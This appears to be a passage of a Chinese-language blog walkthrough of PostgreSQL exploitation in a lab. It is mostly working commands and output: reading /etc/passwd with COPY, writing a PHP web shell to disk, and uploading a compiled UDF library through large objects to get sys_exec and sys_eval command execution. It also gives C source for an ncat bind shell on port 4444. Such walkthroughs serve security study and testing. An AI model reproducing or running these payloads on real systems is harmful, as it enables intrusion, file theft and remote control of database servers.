\timing [<span class="keyword">on</span>|off]       toggle timing of commands (currently off)</span><br><span class="line">  \! [COMMAND]           execute command <span class="keyword">in</span> <span class="keyword">shell</span> or start interactive <span class="keyword">shell</span></span><br><span class="line"></span><br><span class="line">Variables</span><br><span class="line">  \prompt [TEXT] NAME    prompt user to <span class="keyword">set</span> internal variable</span><br><span class="line">  \<span class="keyword">set</span> [NAME [VALUE]]    <span class="keyword">set</span> internal variable, or <span class="keyword">list</span> all <span class="keyword">if</span> <span class="keyword">no</span> parameters</span><br><span class="line">  \unset NAME            unset (delete) internal variable</span><br><span class="line"></span><br><span class="line">Large Objects</span><br><span class="line">  \lo_export LOBOID <span class="keyword">FILE</span></span><br><span class="line">  \lo_import <span class="keyword">FILE</span> [COMMENT]</span><br><span class="line">  \lo_list</span><br><span class="line">  \lo_unlink LOBOID      large object operations</span><br></pre></td></tr></table></figure>
+<hr>
+<p>#####列出数据库列表#####</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">postgres=<span class="comment"># \l</span></span><br><span class="line">                                  List of databases</span><br><span class="line">   Name    |<span class="string">  Owner   </span>|<span class="string"> Encoding </span>|<span class="string">   Collate   </span>|<span class="string">    Ctype    </span>|<span class="string">   Access privileges   </span></span><br><span class="line"><span class="string">-----------+----------+----------+-------------+-------------+-----------------------</span></span><br><span class="line"><span class="string"> msfdb     </span>|<span class="string"> msfuser  </span>|<span class="string"> UTF8     </span>|<span class="string"> en_US.UTF-8 </span>|<span class="string"> en_US.UTF-8 </span>|</span><br><span class="line"> postgres  |<span class="string"> postgres </span>|<span class="string"> UTF8     </span>|<span class="string"> en_US.UTF-8 </span>|<span class="string"> en_US.UTF-8 </span>|</span><br><span class="line"> template0 |<span class="string"> postgres </span>|<span class="string"> UTF8     </span>|<span class="string"> en_US.UTF-8 </span>|<span class="string"> en_US.UTF-8 </span>|<span class="string"> =c/postgres          +</span></span><br><span class="line"><span class="string">           </span>|<span class="string">          </span>|<span class="string">          </span>|<span class="string">             </span>|<span class="string">             </span>|<span class="string"> postgres=CTc/postgres</span></span><br><span class="line"><span class="string"> template1 </span>|<span class="string"> postgres </span>|<span class="string"> UTF8     </span>|<span class="string"> en_US.UTF-8 </span>|<span class="string"> en_US.UTF-8 </span>|<span class="string"> =c/postgres          +</span></span><br><span class="line"><span class="string">           </span>|<span class="string">          </span>|<span class="string">          </span>|<span class="string">             </span>|<span class="string">             </span>|<span class="string"> postgres=CTc/postgres</span></span><br><span class="line"><span class="string">(4 rows)</span></span><br></pre></td></tr></table></figure>
+<hr>
+<p>#####列出数据库用户列表#####</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">postgres=# \du</span><br><span class="line"><span class="code">                             List of roles</span></span><br><span class="line"><span class="code"> Role name |                   Attributes                   | Member of</span></span><br><span class="line">-----------<span class="code">+------------------------------------------------+</span>-----------</span><br><span class="line"><span class="code"> msfuser   |                                                | &#123;&#125;</span></span><br><span class="line"><span class="code"> postgres  | Superuser, Create role, Create DB, Replication | &#123;&#125;</span></span><br></pre></td></tr></table></figure>
+<p>Please try more details about postgresql database.</p>
+<hr>
+<p>####列出目录列表####</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">postgres=# select pg<span class="emphasis">_ls_</span>dir(<span class="emphasis">'/etc'</span>);</span><br><span class="line">ERROR:  absolute path not allowed</span><br><span class="line">postgres=# select pg<span class="emphasis">_ls_</span>dir(<span class="emphasis">'./'</span>);</span><br><span class="line"><span class="code">      pg_ls_dir       </span></span><br><span class="line">----------------------</span><br><span class="line"><span class="code"> postmaster.opts</span></span><br><span class="line"><span class="code"> postmaster.pid</span></span><br><span class="line"><span class="code"> pg_logical</span></span><br><span class="line"><span class="code"> pg_clog</span></span><br><span class="line"><span class="code"> postgresql.auto.conf</span></span><br><span class="line"><span class="code"> pg_hba.conf</span></span><br><span class="line"><span class="code"> cmd.so</span></span><br><span class="line"><span class="code"> pg_multixact</span></span><br><span class="line"><span class="code"> postgresql.conf</span></span><br><span class="line"><span class="code"> pg_ident.conf</span></span><br><span class="line"><span class="code"> global</span></span><br><span class="line"><span class="code"> pg_stat_tmp</span></span><br><span class="line"><span class="code"> PG_VERSION</span></span><br><span class="line"><span class="code"> pg_dynshmem</span></span><br><span class="line"><span class="code"> pg_twophase</span></span><br><span class="line"><span class="code"> pg_xlog</span></span><br><span class="line"><span class="code"> pg_notify</span></span><br><span class="line"><span class="code"> pg_snapshots</span></span><br><span class="line"><span class="code"> pg_tblspc</span></span><br><span class="line"><span class="code"> pg_serial</span></span><br><span class="line"><span class="code"> pg_stat</span></span><br><span class="line"><span class="code"> base</span></span><br><span class="line"><span class="code"> pg_subtrans</span></span><br><span class="line"><span class="code"> pg_replslot</span></span><br><span class="line">(24 rows)</span><br></pre></td></tr></table></figure>
+<hr>
+<p>####文件读取####</p>
+<p><strong>方法一</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">postgres=# select pg_read_file('postgresql.conf', 0, 200);</span><br><span class="line">                pg_read_file                </span><br><span class="line">--------------------------------------------</span><br><span class="line"><span class="meta"> #</span><span class="bash"> -----------------------------           +</span></span><br><span class="line"><span class="meta"> #</span><span class="bash"> PostgreSQL configuration file           +</span></span><br><span class="line"><span class="meta"> #</span><span class="bash"> -----------------------------           +</span></span><br><span class="line"><span class="meta"> #</span><span class="bash">                                         +</span></span><br><span class="line"><span class="meta"> #</span><span class="bash"> This file consists of lines of the form:+</span></span><br><span class="line"><span class="meta"> #</span><span class="bash">                                         +</span></span><br><span class="line"><span class="meta"> #</span><span class="bash">   name = value                          +</span></span><br><span class="line"><span class="meta"> #</span><span class="bash">                                         +</span></span><br><span class="line"><span class="meta"> #</span><span class="bash"> (The <span class="string">"="</span> is optional.)  Whitespace m</span></span><br><span class="line">(1 row)</span><br></pre></td></tr></table></figure>
+<p><strong>方法二</strong></p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">postgres=<span class="comment"># drop table pwn;</span></span><br><span class="line"><span class="symbol">ERROR:</span>  table <span class="string">"pwn"</span> does <span class="keyword">not</span> exist</span><br><span class="line">postgres=<span class="comment"># CREATE TABLE pwn(t TEXT);</span></span><br><span class="line">CREATE TABLE</span><br><span class="line">postgres=<span class="comment"># COPY pwn FROM '/etc/passwd';</span></span><br><span class="line">COPY <span class="number">27</span></span><br><span class="line">postgres=<span class="comment"># SELECT * FROM pwn limit 1 offset 0;</span></span><br><span class="line">                t                </span><br><span class="line">---------------------------------</span><br><span class="line"> <span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line">(<span class="number">1</span> row)</span><br><span class="line"></span><br><span class="line">postgres=<span class="comment"># SELECT * FROM pwn;</span></span><br><span class="line">                                      t                                       </span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line"> <span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"> <span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/bin/nologin</span></span><br><span class="line"> <span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:daemon</span><span class="symbol">:/</span><span class="symbol">:/usr/bin/nologin</span></span><br><span class="line"> <span class="symbol">mail:</span><span class="symbol">x:</span><span class="number">8</span><span class="symbol">:</span><span class="number">12</span><span class="symbol">:mail</span><span class="symbol">:/var/spool/mail</span><span class="symbol">:/usr/bin/nologin</span></span><br><span class="line"> <span class="symbol">ftp:</span><span class="symbol">x:</span><span class="number">14</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:ftp</span><span class="symbol">:/srv/ftp</span><span class="symbol">:/usr/bin/nologin</span></span><br><span class="line"> <span class="symbol">http:</span><span class="symbol">x:</span><span class="number">33</span><span class="symbol">:</span><span class="number">33</span><span class="symbol">:http</span><span class="symbol">:/srv/http</span><span class="symbol">:/usr/bin/nologin</span></span><br><span class="line"> <span class="symbol">uuidd:</span><span class="symbol">x:</span><span class="number">68</span><span class="symbol">:</span><span class="number">68</span><span class="symbol">:uuidd</span><span class="symbol">:/</span><span class="symbol">:/usr/bin/nologin</span></span><br><span class="line"> <span class="symbol">dbus:</span><span class="symbol">x:</span><span class="number">81</span><span class="symbol">:</span><span class="number">81</span><span class="symbol">:dbus</span><span class="symbol">:/</span><span class="symbol">:/usr/bin/nologin</span></span><br><span class="line"> <span class="symbol">nobody:</span><span class="symbol">x:</span><span class="number">99</span><span class="symbol">:</span><span class="number">99</span><span class="symbol">:nobody</span><span class="symbol">:/</span><span class="symbol">:/usr/bin/nologin</span></span><br><span class="line"> systemd-journal-<span class="symbol">gateway:</span><span class="symbol">x:</span><span class="number">191</span><span class="symbol">:</span><span class="number">191</span><span class="symbol">:systemd-journal-gateway</span><span class="symbol">:/</span><span class="symbol">:/usr/bin/nologin</span></span><br><span class="line"> systemd-<span class="symbol">timesync:</span><span class="symbol">x:</span><span class="number">192</span><span class="symbol">:</span><span class="number">192</span><span class="symbol">:systemd-timesync</span><span class="symbol">:/</span><span class="symbol">:/usr/bin/nologin</span></span><br><span class="line"> systemd-<span class="symbol">network:</span><span class="symbol">x:</span><span class="number">193</span><span class="symbol">:</span><span class="number">193</span><span class="symbol">:systemd-network</span><span class="symbol">:/</span><span class="symbol">:/usr/bin/nologin</span></span><br><span class="line"> systemd-bus-<span class="symbol">proxy:</span><span class="symbol">x:</span><span class="number">194</span><span class="symbol">:</span><span class="number">194</span><span class="symbol">:systemd-bus-proxy</span><span class="symbol">:/</span><span class="symbol">:/usr/bin/nologin</span></span><br><span class="line"> systemd-<span class="symbol">resolve:</span><span class="symbol">x:</span><span class="number">195</span><span class="symbol">:</span><span class="number">195</span><span class="symbol">:systemd-resolve</span><span class="symbol">:/</span><span class="symbol">:/usr/bin/nologin</span></span><br><span class="line"> systemd-journal-<span class="symbol">remote:</span><span class="symbol">x:</span><span class="number">999</span><span class="symbol">:</span><span class="number">999</span><span class="symbol">:systemd</span> Journal <span class="symbol">Remote:</span>/<span class="symbol">:/sbin/nologin</span></span><br><span class="line"> systemd-journal-<span class="symbol">upload:</span><span class="symbol">x:</span><span class="number">998</span><span class="symbol">:</span><span class="number">998</span><span class="symbol">:systemd</span> Journal <span class="symbol">Upload:</span>/<span class="symbol">:/sbin/nologin</span></span><br><span class="line"> <span class="symbol">avahi:</span><span class="symbol">x:</span><span class="number">84</span><span class="symbol">:</span><span class="number">84</span><span class="symbol">:avahi</span><span class="symbol">:/</span><span class="symbol">:/bin/false</span></span><br><span class="line"> <span class="symbol">polkitd:</span><span class="symbol">x:</span><span class="number">102</span><span class="symbol">:</span><span class="number">102</span><span class="symbol">:Policy</span> Kit <span class="symbol">Daemon:</span>/<span class="symbol">:/bin/false</span></span><br><span class="line"> <span class="symbol">git:</span><span class="symbol">x:</span><span class="number">997</span><span class="symbol">:</span><span class="number">997</span><span class="symbol">:git</span> daemon <span class="symbol">user:</span>/<span class="symbol">:/bin/bash</span></span><br><span class="line"> <span class="symbol">colord:</span><span class="symbol">x:</span><span class="number">124</span><span class="symbol">:</span><span class="number">124</span><span class="symbol">:</span><span class="symbol">:/var/lib/colord</span><span class="symbol">:/bin/false</span></span><br><span class="line"> <span class="symbol">postgres:</span><span class="symbol">x:</span><span class="number">88</span><span class="symbol">:</span><span class="number">88</span><span class="symbol">:PostgreSQL</span> <span class="symbol">user:</span>/var/lib/<span class="symbol">postgres:</span>/bin/bash</span><br><span class="line"> <span class="symbol">lab:</span><span class="symbol">x:</span><span class="number">1000</span><span class="symbol">:</span><span class="number">1000</span><span class="symbol">:</span><span class="symbol">:/home/notfound</span><span class="symbol">:/bin/bash</span></span><br><span class="line"> <span class="symbol">stunnel:</span><span class="symbol">x:</span><span class="number">16</span><span class="symbol">:</span><span class="number">16</span><span class="symbol">:</span><span class="symbol">:/var/run/stunnel</span><span class="symbol">:/bin/false</span></span><br><span class="line"> <span class="symbol">dnsmasq:</span><span class="symbol">x:</span><span class="number">996</span><span class="symbol">:</span><span class="number">996</span><span class="symbol">:dnsmasq</span> <span class="symbol">daemon:</span>/<span class="symbol">:/usr/bin/nologin</span></span><br><span class="line"> <span class="symbol">mongodb:</span><span class="symbol">x:</span><span class="number">995</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:</span><span class="symbol">:/var/lib/mongodb</span><span class="symbol">:/bin/bash</span></span><br><span class="line"> <span class="symbol">mysql:</span><span class="symbol">x:</span><span class="number">89</span><span class="symbol">:</span><span class="number">89</span><span class="symbol">:</span><span class="symbol">:/var/lib/mysql</span><span class="symbol">:/bin/false</span></span><br><span class="line"> <span class="symbol">sslh:</span><span class="symbol">x:</span><span class="number">994</span><span class="symbol">:</span><span class="number">994</span><span class="symbol">:</span><span class="symbol">:/</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line">(<span class="number">27</span> rows)</span><br><span class="line"></span><br><span class="line">postgres=<span class="comment"># DROP table pwn;</span></span><br></pre></td></tr></table></figure>
+<hr>
+<p>####写入文件####</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">postgres=<span class="comment"># DROP TABLE pwn;</span></span><br><span class="line">DROP TABLE</span><br><span class="line">postgres=<span class="comment"># CREATE TABLE pwn (t TEXT);</span></span><br><span class="line">CREATE TABLE</span><br><span class="line">postgres=<span class="comment"># INSERT INTO pwn(t) VALUES ('&lt;?php @system("$_GET[cmd]");?&gt;');</span></span><br><span class="line">INSERT 0 1</span><br><span class="line">postgres=<span class="comment"># SELECT * FROM pwn;</span></span><br><span class="line">               t                </span><br><span class="line">--------------------------------</span><br><span class="line"> &lt;?php @system(<span class="string">"$_GET[cmd]"</span>);?&gt;</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line">postgres=<span class="comment"># COPY pwn(t) TO '/tmp/cmd.php';</span></span><br><span class="line">COPY 1</span><br><span class="line">postgres=<span class="comment"># DROP TABLE pwn;</span></span><br><span class="line">DROP TABLE</span><br></pre></td></tr></table></figure>
+<hr>
+<p>####UDF hack####</p>
+<p>#####编译源#####</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">lab:</span> <span class="regexp">/ $ git clone https:/</span><span class="regexp">/github.com/</span>sqlmapproject<span class="regexp">/udfhack/</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lab: / $ gcc lib_postgresqludf_sys.c -I`pg_config --includedir-server` -fPIC -shared -o udf64.so</span><br><span class="line">lab: / $ gcc -Wall -I/usr/include/postgresql<span class="built_in">/server </span>-Os -shared lib_postgresqludf_sys.c -fPIC -o lib_postgresqludf_sys.so</span><br><span class="line">lab: / $ strip -sx lib_postgresqludf_sys.so</span><br></pre></td></tr></table></figure>
+<p>#####命令执行#####</p>
+<p>把udf.so转换为十六进制字符串。</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">la</span><span class="variable">b:</span>~/ $ <span class="keyword">cat</span> udf.<span class="keyword">so</span> | hex</span><br></pre></td></tr></table></figure>
+<p>利用数据库特性上传udf.so。</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">postgres=# INSERT <span class="keyword">INTO</span> pg_largeobject (loid, pageno, data) VALUES (<span class="number">19074</span>, <span class="number">0</span>, decode(<span class="string">'079c...'</span>, <span class="string">'hex'</span>));</span><br><span class="line">INSERT <span class="number">0</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">postgres=# <span class="keyword">SELECT</span> lo_export(<span class="number">19074</span>, <span class="string">'cmd.so'</span>);</span><br><span class="line">ERROR:  pg_largeobject entry <span class="keyword">for</span> OID <span class="number">19074</span>, page <span class="number">0</span> <span class="keyword">has</span> invalid data field size <span class="number">3213</span></span><br><span class="line">postgres=# <span class="keyword">SELECT</span> setting <span class="keyword">FROM</span> pg_settings <span class="keyword">WHERE</span> name=<span class="string">'data_directory'</span>;</span><br><span class="line">        setting         </span><br><span class="line">------------------------</span><br><span class="line"> /<span class="keyword">var</span>/lib/postgres/data</span><br><span class="line">(<span class="number">1</span> row)</span><br></pre></td></tr></table></figure>
+<p>Library类库太大了，我们需要把它分成几块，详情可以查看<a href="https://github.com/sqlmapproject/sqlmap/issues/1170" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap/issues/1170</a>.</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">postgres=# <span class="keyword">select</span> * <span class="keyword">from</span> pg_largeobject;</span><br><span class="line"> loid | pageno | data</span><br><span class="line">------+--------+------</span><br><span class="line">(0 rows)</span><br><span class="line"></span><br><span class="line">postgres=# <span class="keyword">SELECT</span> setting <span class="keyword">FROM</span> pg_settings <span class="keyword">WHERE</span> name=<span class="string">'data_directory'</span>;</span><br><span class="line">        setting         </span><br><span class="line">------------------------</span><br><span class="line"> /var/lib/postgres/data</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line">postgres=# <span class="keyword">SELECT</span> lo_creat(<span class="number">-1</span>);</span><br><span class="line"> lo_creat</span><br><span class="line">----------</span><br><span class="line">    19075</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line">postgres=# <span class="keyword">SELECT</span> lo_create(<span class="number">11122</span>);</span><br><span class="line"> lo_create</span><br><span class="line">-----------</span><br><span class="line">     11122</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line">postgres=# <span class="keyword">select</span> * <span class="keyword">from</span> pg_largeobject;</span><br><span class="line"> loid | pageno | data</span><br><span class="line">------+--------+------</span><br><span class="line">(0 rows)</span><br><span class="line"></span><br><span class="line">postgres=# <span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">11122</span>, <span class="number">0</span>, decode(<span class="string">'079c...'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="number">0</span> <span class="number">1</span></span><br><span class="line">postgres=# <span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">11122</span>, <span class="number">1</span>, decode(<span class="string">'a28e...'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="number">0</span> <span class="number">1</span></span><br><span class="line">postgres=# <span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">11122</span>, <span class="number">2</span>, decode(<span class="string">'1265...'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="number">0</span> <span class="number">1</span></span><br><span class="line">postgres=# <span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">11122</span>, <span class="number">3</span>, decode(<span class="string">'c62e...'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="number">0</span> <span class="number">1</span></span><br><span class="line">postgres=# <span class="keyword">SELECT</span> lo_export(<span class="number">11122</span>, <span class="string">'/tmp/cmd.so'</span>);</span><br><span class="line"> lo_export</span><br><span class="line">-----------</span><br><span class="line">         1</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line">postgres=# <span class="keyword">SELECT</span> lo_unlink(<span class="number">11122</span>);</span><br><span class="line"> lo_unlink</span><br><span class="line">-----------</span><br><span class="line">         1</span><br><span class="line">(1 row)</span><br></pre></td></tr></table></figure>
+<p>成功上传library类库, 然后创建postgresql函数.</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">postgres=# <span class="keyword">CREATE</span> <span class="keyword">OR</span> <span class="built_in">REPLACE</span> <span class="keyword">FUNCTION</span> sys_exec(text) RETURNS int4 <span class="keyword">AS</span> <span class="string">'/tmp/udf64.so'</span>, <span class="string">'sys_exec'</span> LANGUAGE C RETURNS <span class="literal">NULL</span> <span class="keyword">ON</span> <span class="literal">NULL</span> INPUT IMMUTABLE;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span></span><br><span class="line">postgres=# <span class="keyword">CREATE</span> <span class="keyword">OR</span> <span class="built_in">REPLACE</span> <span class="keyword">FUNCTION</span> sys_eval(text) RETURNS text <span class="keyword">AS</span> <span class="string">'/tmp/udf64.so'</span>, <span class="string">'sys_eval'</span> LANGUAGE C RETURNS <span class="literal">NULL</span> <span class="keyword">ON</span> <span class="literal">NULL</span> INPUT IMMUTABLE;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span></span><br></pre></td></tr></table></figure>
+<p>用<strong>sys_exec</strong>执行命令, 然后什么也没有返回.</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">postgres=# <span class="keyword">SELECT</span> sys_exec(<span class="symbol">'id</span>');</span><br><span class="line"> sys_exec</span><br><span class="line"><span class="comment">----------</span></span><br><span class="line">        <span class="number">0</span></span><br><span class="line">(<span class="number">1</span> row)</span><br></pre></td></tr></table></figure>
+<p>执行命令后，清除函数。</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">postgres=# <span class="keyword">DROP</span> <span class="keyword">FUNCTION</span> sys_exec(text);</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">FUNCTION</span></span><br><span class="line">postgres=# <span class="keyword">DROP</span> <span class="keyword">FUNCTION</span> sys_eval(text);</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">FUNCTION</span></span><br></pre></td></tr></table></figure>
+<p>#####绑定shell#####</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bind shell on port 4444</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"postgres.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"fmgr.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PG_MODULE_MAGIC</span></span><br><span class="line">PG_MODULE_MAGIC;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">text *<span class="built_in">exec</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">system</span>(<span class="string">"ncat -e /bin/bash -l -p 4444"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译源码</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">la</span><span class="variable">b:postgres_cmd</span>/ $  <span class="keyword">vim</span> nc.<span class="keyword">c</span></span><br><span class="line"><span class="keyword">la</span><span class="variable">b:postgres_cmd</span>/ $  gcc nc.<span class="keyword">c</span> -I`pg_config --includedir-server` -fPIC -shared -<span class="keyword">o</span> nc.<span class="keyword">so</span></span><br><span class="line"><span class="keyword">la</span><span class="variable">b:postgres_cmd</span>/ $  strip -sx nc.<span class="keyword">so</span></span><br></pre></td></tr></table></figure>
+<p>复制nc.so到postgresql的tmp目录, 或者你可以利用数据库特性上传so文件.</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">la</span><span class="variable">b:postgres_cmd</span>/ $  sudo <span class="keyword">cp</span> nc.<span class="keyword">so</span> /tmp/systemd-private-<span class="number">374</span>c1bd49d5f425ca21cca8cc6d89de7-postgresql.service-SKrVjI/tmp/nc.<span class="keyword">so</span></span><br></pre></td></tr></table></figure>
+<p>为绑定shell创建执行函数，用客户端连接到目标.</p>
